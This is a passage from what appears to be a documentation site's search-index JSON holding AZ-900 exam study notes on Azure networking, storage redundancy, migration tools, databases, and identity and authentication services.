instances","text":"<p>Azure VPN Gateway instances are deployed in a dedicated subnet of the virtual network and enable the following connectivity: - Connect on-premises datacenters to virtual networks through a site-to-site connection. - Connect individual devices to virtual networks through a point-to-site connection. - Connect virtual networks to other virtual networks through a network-to-network connection.</p> <p>When setting up a VPN gateway, you must specify the type of VPN - either policy-based or route-based:</p> <ul> <li>Policy-based VPN gateways specify statically the IP address of packets that should be encrypted through each tunnel. This type of device evaluates every data packet against those sets of IP addresses to choose the tunnel where that packet is going to be sent through.</li> <li>In Route-based gateways, IPSec tunnels are modeled as a network interface or virtual tunnel interface. IP routing (either static routes or dynamic routing protocols) decides which one of these tunnel interfaces to use when sending each packet. Route-based VPNs are the preferred connection method for on-premises devices. They're more resilient to topology changes such as the creation of new subnets.</li> </ul> <p>Use a route-based VPN gateway if you need any of the following types of connectivity:</p> <ul> <li>Connections between virtual networks</li> <li>Point-to-site connections</li> <li>Multisite connections</li> <li>Coexistence with an Azure ExpressRoute gateway</li> </ul> <p>There are a few ways to maximize the resiliency of your VPN gateway:</p> <p>Active/standby: By default, VPN gateways are deployed as two instances in an active/standby configuration, even if you only see one VPN gateway resource in Azure. When planned maintenance or unplanned disruption affects the active instance, the standby instance automatically assumes responsibility for connections without any user intervention.</p> <p>Active/active: With the introduction of support for the BGP routing protocol, you can also deploy VPN gateways in an active/active configuration. In this configuration, you assign a unique public IP address to each instance. You then create separate tunnels from the on-premises device to each IP address. </p> <p>ExpressRoute failover: Another high-availability option is to configure a VPN gateway as a secure failover path for ExpressRoute connections. ExpressRoute circuits have resiliency built in. However, they aren't immune to physical problems that affect the cables delivering connectivity or outages that affect the complete ExpressRoute location. </p> <p>Zone-redundant gateways: In regions that support availability zones, VPN gateways and ExpressRoute gateways can be deployed in a zone-redundant configuration. This configuration brings resiliency, scalability, and higher availability to virtual network gateways.  These gateways require different gateway stock keeping units (SKUs) and use Standard public IP addresses instead of Basic public IP addresses.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#9-azure-expressroute","title":"9.  Azure ExpressRoute","text":"<p>Azure ExpressRoute lets you extend your on-premises networks into the Microsoft cloud over a private connection, with the help of a connectivity provider. This connection is called an ExpressRoute Circuit. These connection between Microsoft cloud services (such as Microsoft Azure and Microsoft 365) and the offices, datacenters, or other facilities would require its own ExpressRoute circuit.</p> <p>ExpressRoute connections don't go over the public Internet. ExpressRoute is a private connection from your on-premises infrastructure to your Azure infrastructure. Even if you have an ExpressRoute connection, DNS queries, certificate revocation list checking, and Azure Content Delivery Network requests are still sent over the public internet.</p> <ul> <li>Connectivity to Microsoft cloud services across all regions in the geopolitical region.</li> <li>Global connectivity to Microsoft services across all regions with the ExpressRoute Global Reach.</li> <li>Dynamic routing between your network and Microsoft via Border Gateway Protocol (BGP).</li> <li>Built-in redundancy in every peering location for higher reliability.</li> </ul> <p>ExpressRoute enables direct access to the following services in all regions:</p> <ul> <li>Microsoft Office 365</li> <li>Microsoft Dynamics 365</li> <li>Azure compute services, such as Azure Virtual Machines</li> <li>Azure cloud services, such as Azure Cosmos DB and Azure Storage</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#features","title":"Features","text":"<p>Global connectivity: For example, say you had an office in Asia and a datacenter in Europe, both with ExpressRoute circuits connecting them to the Microsoft network. You could use ExpressRoute Global Reach to connect those two facilities, allowing them to communicate without transferring data over the public internet.</p> <p>Dynamic routing: ExpressRoute uses the BGP. BGP is used to exchange routes between on-premises networks and resources running in Azure. This protocol enables dynamic routing between your on-premises network and services running in the Microsoft cloud.</p> <p>Built-in redundancy: Each connectivity provider uses redundant devices to ensure that connections established with Microsoft are highly available. You can configure multiple circuits to complement this feature.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#expressroute-connectivity-models","title":"ExpressRoute connectivity models","text":"<p>ExpressRoute supports four models that you can use to connect your on-premises network to the Microsoft cloud:</p> <p>Co-location at a cloud exchange: Your datacenter, office, or other facility is  physically co-located at a cloud exchange, such as an ISP. In this case, you can request a virtual cross-connect to the Microsoft cloud.</p> <p>Point-to-point Ethernet connection: Point-to-point ethernet connection refers to using a point-to-point connection to connect your facility to the Microsoft cloud.</p> <p>Any-to-any networks: With any-to-any connectivity, you can integrate your wide area network (WAN) with Azure by providing connections to your offices and datacenters. Azure integrates with your WAN connection to provide a connection like you would have between your datacenter and any branch offices.</p> <p>Directly from ExpressRoute sites: You can connect directly into the Microsoft's global network at a peering location strategically distributed across the world. ExpressRoute Direct provides dual 100 Gbps or 10-Gbps connectivity, which supports Active/Active connectivity at scale.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#10-azure-dns","title":"10. Azure DNS","text":"<p>Azure DNS is a hosting service for DNS domains that provides name resolution by using Microsoft Azure infrastructure. By hosting your domains in Azure, you can manage your DNS records using the same credentials, APIs, tools, and billing as your other Azure services. Azure DNS can manage DNS records for your Azure services and provide DNS for your external resources as well. Applications that require automated DNS management can integrate with the service by using the REST API and SDKs.</p> <p>Azure DNS is based on Azure Resource Manager, which provides features such as:</p> <ul> <li>Azure role-based access control (Azure RBAC) to control who has access to specific actions for your organization.</li> <li>Activity logs to monitor how a user in your organization modified a resource or to find an error when troubleshooting. </li> <li>Resource locking to lock a subscription, resource group, or resource. Locking prevents other users in your organization from accidentally deleting or modifying critical resources.</li> </ul> <p>Azure DNS also supports private DNS domains. This feature allows you to use your own custom domain names in your private virtual networks, rather than being stuck with the Azure-provided names.</p> <p>Azure DNS also supports alias record sets. You can use an alias record set to refer to an Azure resource, such as an Azure public IP address, an Azure Traffic Manager profile, or an Azure Content Delivery Network (CDN) endpoint. </p> <p>You can't use Azure DNS to buy a domain name. For an annual fee, you can buy a domain name by using App Service domains or a third-party domain name registrar. Once purchased, your domains can be hosted in Azure DNS for record management.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-storage-services","title":"Azure Storage Services","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#intro","title":"Intro","text":"<p>A storage account provides a unique namespace for your Azure Storage data that's accessible from anywhere in the world over HTTP or HTTPS. Data in this account is secure, highly available, durable, and massively scalable.  When you create your storage account, you\u2019ll start by picking the storage account type. The type of account determines the storage services and redundancy options and has an impact on the use cases.</p> Type Supported services Redundancy Options Usage Standard general-purpose v2 Blob Storage (including Data Lake Storage), Queue Storage, Table Storage, and Azure Files LRS, GRS, RA-GRS, ZRS, GZRS, RA-GZRS Standard storage account type for blobs, file shares, queues, and tables. Recommended for most scenarios using Azure Storage. If you want support for network file system (NFS) in Azure Files, use the premium file shares account type. Premium block blobs Blob Storage (including Data Lake Storage) LRS, ZRS Premium storage account type for block blobs and append blobs. Recommended for scenarios with high transaction rates or that use smaller objects or require consistently low storage latency. Premium file shares Azure Files LRS, ZRS Premium storage account type for file shares only. Recommended for enterprise or high-performance scale applications. Use this account type if you want a storage account that supports both Server Message Block (SMB) and NFS file shares. Premium page blobs Page blobs only LRS Premium storage account type for page blobs only. <p>Some acronyms here:</p> <ul> <li>Locally redundant storage (LRS)</li> <li>Geo-redundant storage (GRS)</li> <li>Read-access geo-redundant storage (RA-GRS)</li> <li>Zone-redundant storage (ZRS)</li> <li>Geo-zone-redundant storage (GZRS)</li> <li>Read-access geo-zone-redundant storage (RA-GZRS)</li> </ul> <p>Storage account endpoints:</p> <p>The following table shows the endpoint format for Azure Storage services.</p> Storage service Endpoint Blob Storage https://\\&lt;storage-account-name&gt;.blob.core.windows.net Data Lake Storage Gen2 https://\\&lt;storage-account-name&gt;.dfs.core.windows.net Azure Files https://\\&lt;storage-account-name&gt;.file.core.windows.net Queue Storage https://\\&lt;storage-account-name&gt;.queue.core.windows.net Table Storage https://\\&lt;storage-account-name&gt;.table.core.windows.net <p>Other data for the exam:</p> <ul> <li>Maximum capacity for storage accounts: 5 PB.</li> <li>Number of storage accounts per region per suscription: 250.</li> <li>Maximum number of virtual network rules and IP network rules allowed per storage account in Azure: 200</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-storage-redundancy","title":"Azure storage redundancy","text":"<p>Data in an Azure Storage account is always replicated three times in the primary region. Azure Storage offers two options for how your data is replicated in the primary region, locally redundant storage (LRS) and zone-redundant storage (ZRS).</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#redundancy-in-the-primary-region","title":"Redundancy in the primary region","text":"<p>Locally redundant storage (LRS)</p> <p>Locally redundant storage (LRS) replicates your data three times within a single data center in the primary region. LRS provides at least 11 nines of durability (99.999999999%) of objects over a given year. LRS is the lowest-cost redundancy option and offers the least durability compared to other options. LRS protects your data against server rack and drive failures. However, if a disaster such as fire or flooding occurs within the data center, all replicas of a storage account using LRS may be lost or unrecoverable. To mitigate this risk, Microsoft recommends using zone-redundant storage (ZRS), geo-redundant storage (GRS), or geo-zone-redundant storage (GZRS).</p> <p></p> <p>Zone-redundant storage (ZRS)</p> <p>For Availability Zone-enabled Regions, zone-redundant storage (ZRS) replicates your Azure Storage data synchronously across three Azure availability zones in the primary region. ZRS offers durability for Azure Storage data objects of at least 12 nines (99.9999999999%) over a given year. With ZRS, your data is still accessible for both read and write operations even if a zone becomes unavailable. Microsoft recommends using ZRS in the primary region for scenarios that require high availability. ZRS is also recommended for restricting replication of data within a country or region to meet data governance requirements.</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#redundancy-in-the-secondary-region","title":"Redundancy in the secondary region","text":"<p>For applications requiring high durability, you can choose to additionally copy the data in your storage account to a secondary region that is hundreds of miles away from the primary region. If the data in your storage account is copied to a secondary region, then your data is durable even in the event of a catastrophic failure that prevents the data in the primary region from being recovered. When you create a storage account, you select the primary region for the account. The paired secondary region is based on Azure Region Pairs, and can't be changed.</p> <p>By default, data in the secondary region isn't available for read or write access unless there's a failover to the secondary region. If the primary region becomes unavailable, you can choose to fail over to the secondary region. After the failover has completed, the secondary region becomes the primary region, and you can again read and write data.</p> <p>Because data is replicated to the secondary region asynchronously, a failure that affects the primary region may result in data loss if the primary region can't be recovered. The interval between the most recent writes to the primary region and the last write to the secondary region is known as the recovery point objective (RPO). The RPO indicates the point in time to which data can be recovered. Azure Storage typically has an RPO of less than 15 minutes, although there's currently no SLA on how long it takes to replicate data to the secondary region.</p> <p>Azure Storage offers two options for copying your data to a secondary region: geo-redundant storage (GRS) and geo-zone-redundant storage (GZRS). GRS is similar to running LRS in two regions, and GZRS is similar to running ZRS in the primary region and LRS in the secondary region.</p> <p>Geo-redundant storage (GRS)</p> <p>GRS copies your data synchronously three times within a single physical location in the primary region using LRS. It then copies your data asynchronously to a single physical location in the secondary region (the region pair) using LRS. GRS offers durability for Azure Storage data objects of at least 16 nines (99.99999999999999%) over a given year.</p> <p></p> <p>Geo-zone-redundant storage (GZRS)</p> <p>GZRS combines the high availability provided by redundancy across availability zones with protection from regional outages provided by geo-replication. Data in a GZRS storage account is copied across three Azure availability zones in the primary region (similar to ZRS) and is also replicated to a secondary geographic region, using LRS, for protection from regional disasters. Microsoft recommends using GZRS for applications requiring maximum consistency, durability, and availability, excellent performance, and resilience for disaster recovery. GZRS is designed to provide at least 16 nines (99.99999999999999%) of durability of objects over a given year.</p> <p></p> <p>Read access to data in the secondary region (RA-GRS)</p> <p>Geo-redundant storage (with GRS or GZRS) replicates your data to another physical location in the secondary region to protect against regional outages. However, that data is available to be read only if the customer or Microsoft initiates a failover from the primary to secondary region. However, if you enable read access to the secondary region, your data is always available, even when the primary region is running optimally. For read access to the secondary region, enable read-access geo-redundant storage (RA-GRS) or read-access geo-zone-redundant storage (RA-GZRS). Remember that the data in your secondary region may not be up-to-date due to RPO.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-storage-services_1","title":"Azure storage services","text":"<ul> <li> <ol> <li>Azure Blobs: A massively scalable object store for text and binary data. Also includes support for big data analytics through Data Lake Storage Gen2.</li> </ol> </li> <li> <ol> <li>Azure Files: Managed file shares for cloud or on-premises deployments.</li> </ol> </li> <li> <ol> <li>Azure Queues: A messaging store for reliable messaging between application components.</li> </ol> </li> <li> <ol> <li>Azure Disks: Block-level storage volumes for Azure VMs.</li> </ol> </li> <li> <ol> <li>Azure Tables:\u00a0NoSQL table option for structured, non-relational data.</li> </ol> </li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-blobs","title":"Azure Blobs","text":"<p>To store massive amounts of data, such as text or binary data. Azure Blob storage is unstructured, meaning that there are no restrictions on the kinds of data it can hold. Blob storage is ideal for:</p> <ul> <li>Serving images or documents directly to a browser.</li> <li>Storing files for distributed access.</li> <li>Streaming video and audio.</li> <li>Storing data for backup and restore, disaster recovery, and archiving.</li> <li>Storing data for analysis by an on-premises or Azure-hosted service.</li> </ul> <p>Objects in blob storage can be accessed from anywhere in the world via HTTP or HTTPS. Users or client applications can access blobs via URLs, the Azure Storage REST API, Azure PowerShell, Azure CLI, or an Azure Storage client library.</p> <p>Azure Storage offers different access tiers for your blob storage:</p> <ul> <li>Hot access tier: Optimized for storing data that is accessed frequently (for example, images for your website).</li> <li>Cool access tier: Optimized for data that is infrequently accessed and stored for at least 30 days (for example, invoices for your customers).</li> <li>Cold access tier: Optimized for storing data that is infrequently accessed and stored for at least 90 days.</li> <li>Archive access tier: Appropriate for data that is rarely accessed and stored for at least 180 days, with flexible latency requirements (for example, long-term backups).</li> </ul> <p>Some considerations:</p> <ul> <li>Hot, cool, and cold access tiers can be set at the account level. The archive access tier isn't available at the account level.</li> <li>Hot, cool, cold, and archive tiers can be set at the blob level, during or after upload.</li> <li>Data in the cool and cold access tiers can tolerate slightly lower availability, but still requires high durability, retrieval latency, and throughput characteristics similar to hot data. For cool and cold data, a lower availability service-level agreement (SLA) and higher access costs compared to hot data are acceptable trade-offs for lower storage costs.</li> <li>Archive storage stores data offline and offers the lowest storage costs, but also the highest costs to rehydrate and access data.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-files","title":"Azure Files","text":"<p>Azure File storage offers fully managed file shares in the cloud that are accessible via the industry standard Server Message Block (SMB) or Network File System (NFS) protocols. Azure Files file shares can be mounted concurrently by cloud or on-premises deployments. SMB Azure file shares are accessible from Windows, Linux, and macOS clients. NFS Azure Files shares are accessible from Linux or macOS clients. </p> <p>PowerShell cmdlets and Azure CLI can be used to create, mount, and manage Azure file shares as part of the administration of Azure applications. You can create and manage Azure file shares using Azure portal and Azure Storage Explorer.</p> <p>Applications running in Azure can access data in the share via file system I/O APIs. \u00a0In addition to System IO APIs, you can use Azure Storage Client Libraries or the Azure Storage REST API.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-queues","title":"Azure Queues","text":"<p>Azure Queue storage is a service for storing large numbers of messages. Once stored, you can access the messages from anywhere in the world via authenticated calls using HTTP or HTTPS. A queue can contain as many messages as your storage account has room for (potentially millions). Each individual message can be up to 64 KB in size. Queues are commonly used to create a backlog of work to process asynchronously.</p> <p>Queue storage can be combined with compute functions like Azure Functions to take an action when a message is received. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-disks","title":"Azure Disks","text":"<p>Azure Disk storage, or Azure managed disks, are block-level storage volumes managed by Azure for use with Azure VMs. Conceptually, they\u2019re the same as a physical disk, but they\u2019re virtualized \u2013 offering greater resiliency and availability than a physical disk. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-tables","title":"Azure Tables","text":"<p>Azure Table storage stores large amounts of structured data. Azure tables are a NoSQL datastore that accepts authenticated calls from inside and outside the Azure cloud. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-data-migration-options","title":"Azure data migration options","text":"<p>Azure Migrate is a service that helps you migrate from an on-premises environment to the cloud: - Unified migration platform: A single portal to start, run, and track your migration to Azure. - Range of tools: Azure Migrate also integrates with other Azure services and tools, and with independent software vendor (ISV) offerings. - Assessment and migration: In the Azure Migrate hub, you can assess and migrate your on-premises infrastructure to Azure.</p> <p>Tools to help with migration:</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-migrate-discovery-and-assessment","title":"Azure Migrate: Discovery and assessment","text":"<p>Discover and assess on-premises servers running on VMware, Hyper-V, and physical servers in preparation for migration to Azure.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-migrate-server-migration","title":"Azure Migrate: Server Migration","text":"<p>Migrate VMware VMs, Hyper-V VMs, physical servers, other virtualized servers, and public cloud VMs to Azure.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#data-migration-assistant","title":"Data Migration Assistant","text":"<p>Data Migration Assistant is a stand-alone tool to assess SQL Servers. It helps pinpoint potential problems blocking migration. It identifies unsupported features, new features that can benefit you after migration, and the right path for database migration.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-database-migration-service","title":"Azure Database Migration Service","text":"<p>Migrate on-premises databases to Azure VMs running SQL Server, Azure SQL Database, or SQL Managed Instances.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-app-service-migration-assistant","title":"Azure App Service migration assistant","text":"<p>Azure App Service migration assistant is a standalone tool to assess on-premises websites for migration to Azure App Service. Use Migration Assistant to migrate .NET and PHP web apps to Azure.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-data-box","title":"Azure Data Box","text":"<p>Azure Data Box is a physical migration service that helps transfer large amounts of data in a quick, inexpensive, and reliable way. The secure data transfer is accelerated by shipping you a proprietary Data Box storage device that has a maximum usable storage capacity of 80 terabytes. The Data Box is transported to and from your datacenter via a regional carrier. A rugged case protects and secures the Data Box from damage during transit. You can order the Data Box device via the Azure portal to import or export data from Azure. Data Box is ideally suited to transfer data sizes larger than 40 TBs in scenarios with no to limited network connectivity.</p> <p>Use cases for importing data:      - Onetime migration - when a large amount of on-premises data is moved to Azure.     - Moving a media library from offline tapes into Azure to create an online media library.     - Migrating your VM farm, SQL server, and applications to Azure.     - Moving historical data to Azure for in-depth analysis and reporting using HDInsight.     - Initial bulk transfer - when an initial bulk transfer is done using Data Box (seed) followed by incremental transfers over the network.     - Periodic uploads - when large amount of data is generated periodically and needs to be moved to Azure.</p> <p>Use cases for exporting data:     - Disaster recovery - when a copy of the data from Azure is restored to an on-premises network.     - Security requirements - when you need to be able to export data out of Azure due to government or security requirements.     - Migrate back to on-premises or to another cloud service provider - when you want to move all the data back to on-premises, or to another cloud service provider, export data via Data Box to migrate the workloads.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azcopy","title":"AzCopy","text":"<p>In addition to large scale migration using services like Azure Migrate and Azure Data Box, Azure also has tools designed to help you move or interact with individual files or small file groups.</p> <p>AzCopy is a command-line utility that you can use to copy blobs or files to or from your storage account. Synchronizing blobs or files with AzCopy is one-direction synchronization. When you synchronize, you designated the source and destination, and AzCopy will copy files or blobs in that direction. It doesn't synchronize bi-directionally based on timestamps or other metadata.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-storage-explorer","title":"Azure Storage Explorer","text":"<p>In addition to large scale migration using services like Azure Migrate and Azure Data Box, Azure also has tools designed to help you move or interact with individual files or small file groups.</p> <p>Azure Storage Explorer is a standalone app that provides a graphical interface to manage files and blobs in your Azure Storage Account. It works on Windows, macOS, and Linux operating systems and uses AzCopy on the backend to perform all of the file and blob management tasks.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-file-sync","title":"Azure File Sync","text":"<p>In addition to large scale migration using services like Azure Migrate and Azure Data Box, Azure also has tools designed to help you move or interact with individual files or small file groups.</p> <p>Azure File Sync is a tool that lets you centralize your file shares in Azure Files and keep the flexibility, performance, and compatibility of a Windows file server. </p> <p>With Azure File Sync, you can:</p> <ul> <li>Use any protocol that's available on Windows Server to access your data locally, including SMB, NFS, and FTPS.</li> <li>Have as many caches as you need across the world.</li> <li>Replace a failed local server by installing Azure File Sync on a new server in the same datacenter.</li> <li>Configure cloud tiering so the most frequently accessed files are replicated locally, while infrequently accessed files are kept in the cloud until requested.</li> </ul>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-data-services","title":"Azure Data Services","text":"<p>Key databases in Azure: Azure Cosmos DB, Azure SQL Database, and Azure Database Migration Service.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#cosmos-db","title":"Cosmos DB","text":"<p>Azure Cosmos DB is a multimodel database service that enables to scale data out to multiple Azure regions across the world. This enables us to build applications available at a global scale</p> <p>Fast, distributed NoSQL and relational database at any scale (additionally it supports SQL for querying data stored in Cosmos). Ideal for developing high-performance applications of any size or scale with a fully managed and serverless distributed database supporting open-source PostgreSQL, MongoDB, and Apache Cassandra as well as Java, Node.JS, Python, and .NET.</p> <p>Use case: As an example, Cosmos DB provides a highly scalable solution to build and query graph-based data solutions.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-sql-database","title":"Azure SQL Database","text":"<p>Azure SQL Database is a PaaS offering in which Microsoft hosts the SQL platform and manages maintenance like upgrades and patching, monitoring, and all activities to assure a 99.99% uptime.</p> <p>Additionally, it's a relational database as a service (DaaS) based on the latest stable version of the Microsoft SQL Server database engine.</p> <p>Use case: Flexible, fast, and elastic SQL database for your new apps. Build apps that scale with a fully managed and intelligent SQL database built for the cloud.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-database-migration-service_1","title":"Azure Database Migration Service","text":"<p>It's a fully-managed service designed to enable seamless migrations from multiple database sources to Azure data platforms with minimal downtime.</p> <p>It uses the Microsoft Data Migration Assistant to generate assessment reports previous to a migration.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#sql-database-elastic-pools","title":"SQL Database elastic pools","text":"<p>Just like Azure VM\u00a0Scale Sets are used with VMs, you can use\u00a0Elastic Pools\u00a0with Azure SQL\u00a0Databases!</p> <p>SQL Database elastic pools\u00a0are a simple, cost-effective solution for managing and scaling multiple databases that have varying and unpredictable usage demands. The databases in an elastic pool are on a single Azure SQL Database server and share a set number of resources at a set price. Elastic pools in Azure SQL Database enable SaaS developers to optimize the price performance for a group of databases within a prescribed budget while delivering performance elasticity for each database.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#other-database-services-postgresql-mariadb-mysql-redis-cache","title":"Other database services:  PostgreSQL, MariaDB, MySQL, Redis Cache","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-database-for-postgresql","title":"Azure Database for PostgreSQL","text":"<p>Fully managed, intelligent, and scalable PostgreSQL database. </p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-database-for-mysql","title":"Azure Database for MySQL","text":"<p>Scalable, open-source MySQL database</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-database-for-mariadb","title":"Azure Database for MariaDB","text":"<p>Fully managed, community MariaDB</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-cache-for-redis","title":"Azure Cache for Redis","text":"<p>Distributed, in-memory, scalable caching</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-identity-access-and-security","title":"Azure identity, access, and security","text":"","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-directory-services","title":"Azure directory services","text":"<p>When you secure identities on-premises with Active Directory, Microsoft doesn't monitor sign-in attempts. When you connect Active Directory with Azure AD, Microsoft can help protect you by detecting suspicious sign-in attempts at no extra cost.</p> <p>Azure AD provides services such as: - Authentication: This includes verifying identity to access applications and resources. It also includes providing functionality such as self-service password reset, multifactor authentication, a custom list of banned passwords, and smart lockout services. - Single sign-on: Single sign-on (SSO) enables you to remember only one username and one password to access multiple applications. A single identity is tied to a user, which simplifies the security model. As users change roles or leave an organization, access modifications are tied to that identity, which greatly reduces the effort needed to change or disable accounts. - Application management: You can manage your cloud and on-premises apps by using Azure AD. Features like Application Proxy, SaaS apps, the My Apps portal, and single sign-on provide a better user experience. - Device management: Along with accounts for individual people, Azure AD supports the registration of devices. Registration enables devices to be managed through tools like Microsoft Intune. It also allows for device-based Conditional Access policies to restrict access attempts to only those coming from known devices, regardless of the requesting user account.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-ad-connect","title":"Azure AD Connect","text":"<p>If you had an on-premises environment running Active Directory and a cloud deployment using Azure AD, you would need to maintain two identity sets. However, you can connect Active Directory with Azure AD, enabling a consistent identity experience between cloud and on-premises.</p> <p>One method of connecting Azure AD with your on-premises AD is using Azure AD Connect. Azure AD Connect synchronizes user identities between on-premises Active Directory and Azure AD. Azure AD Connect synchronizes changes between both identity systems, so you can use features like SSO, multifactor authentication, and self-service password reset under both systems.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-active-directory-domain-services-azure-ad-ds","title":"Azure Active Directory Domain Services (Azure AD DS)","text":"<p>Azure Active Directory Domain Services (Azure AD DS) is a service that provides managed domain services such as domain join, group policy, lightweight directory access protocol (LDAP), and Kerberos/NTLM authentication. Just like Azure AD lets you use directory services without having to maintain the infrastructure supporting it, with Azure AD DS, you get the benefit of domain services without the need to deploy, manage, and patch domain controllers (DCs) in the cloud.</p> <p>Azure AD DS integrates with your existing Azure AD tenant. This integration lets users sign into services and applications connected to the managed domain using their existing credentials.</p> <p>How does Azure AD DS work?  When you create an Azure AD DS managed domain, you define a unique namespace. This namespace is the domain name. Two Windows Server domain controllers are then deployed into your selected Azure region. This deployment of DCs is known as a replica set. You don't need to manage, configure, or update these DCs. The Azure platform handles the DCs as part of the managed domain, including backups and encryption at rest using Azure Disk Encryption.</p> <p>A managed domain is configured to perform a one-way synchronization from Azure AD to Azure AD DS. You can create resources directly in the managed domain, but they aren't synchronized back to Azure AD.</p> <p></p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-authentication-services","title":"Azure authentication services","text":"<p>Authentication is the process of establishing the identity of a person, service, or device. Azure supports multiple authentication methods, including standard passwords, single sign-on (SSO), multifactor authentication (MFA), and passwordless.</p> <p>Single sign-on (SSO) enables a user to sign in one time and use that credential to access multiple resources and applications from different providers. Single sign-on is only as secure as the initial authenticator because the subsequent connections are all based on the security of the initial authenticator.</p> <p>Multifactor authentication (MFA) is the process of prompting a user for an extra form (or factor) of identification during the sign-in process. These factors fall into three categories:</p> <ul> <li>Something the user knows \u2013 this might be a challenge #### Question.</li> <li>Something the user has \u2013 this might be a code that's sent to the user's mobile phone.</li> <li>Something the user is \u2013 this is typically some sort of biometric property, such as a fingerprint or face scan.</li> </ul> <p>Passwordless authentication methods are more convenient because the password is removed and replaced with something you have, plus something you are, or something you know. Passwordless authentication needs to be set up on a device before it can work.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#azure-ad-multi-factor-authentication","title":"Azure AD Multi-Factor Authentication","text":"<p>Azure AD Multi-Factor Authentication is a Microsoft service that provides multifactor authentication capabilities. Azure AD Multi-Factor Authentication enables users to choose an additional form of authentication during sign-in, such as a phone call or mobile app notification.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#windows-hello-for-business","title":"Windows Hello for Business","text":"<p>Each organization has different needs when it comes to authentication. Microsoft global Azure and Azure Government offer this passwordless authentication service that integrate with Azure Active Directory (Azure AD).</p> <p>Windows Hello for Business is ideal for information workers that have their own designated Windows PC. The biometric and PIN credentials are directly tied to the user's PC, which prevents access from anyone other than the owner. With public key infrastructure (PKI) integration and built-in support for single sign-on (SSO), Windows Hello for Business provides a convenient method for seamlessly accessing corporate resources on-premises and in the cloud.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#microsoft-authenticator-app","title":"Microsoft Authenticator App","text":"<p>Each organization has different needs when it comes to authentication. Microsoft global Azure and Azure Government offer this passwordless authentication service that integrate with Azure Active Directory (Azure AD).</p> <p>The Authenticator App turns any iOS or Android phone into a strong, passwordless credential. Users can sign-in to any platform or browser by getting a notification to their phone, matching a number displayed on the screen to the one on their phone, and then using their biometric (touch or face) or PIN to confirm.</p>","tags":["cloud","azure","az-900","course","certification"]},{"location":"cloud/azure/az-900-preparation/#fido2-security-keys","title":"FIDO2 security keys","text":"<p>Each organization has different needs when it comes to authentication. Microsoft global Azure and Azure Government offer this passwordless authentication service that integrate with Azure Active Directory (Azure AD).</p> <p>Fast Identity Online (FIDO) is an open standard for passwordless authentication. FIDO allows users and organizations to leverage the standard to sign-in to their resources without a username or password by using an external security key or a platform key built into a device. Users can register and then select a FIDO2 security key at the sign-in interface as their main means of authentication. These FIDO2 security keys are typically USB devices, but could also use Bluetooth or NFC. With a hardware device that handles the authentication, the security of an account is increased as there's no password that could be exposed or guessed.</p> <p>The FIDO (Fast IDentity Online) Alliance helps to promote open authentication standards and reduce the use of passwords as a form of authentication. FIDO2 is the latest standard that incorporates the 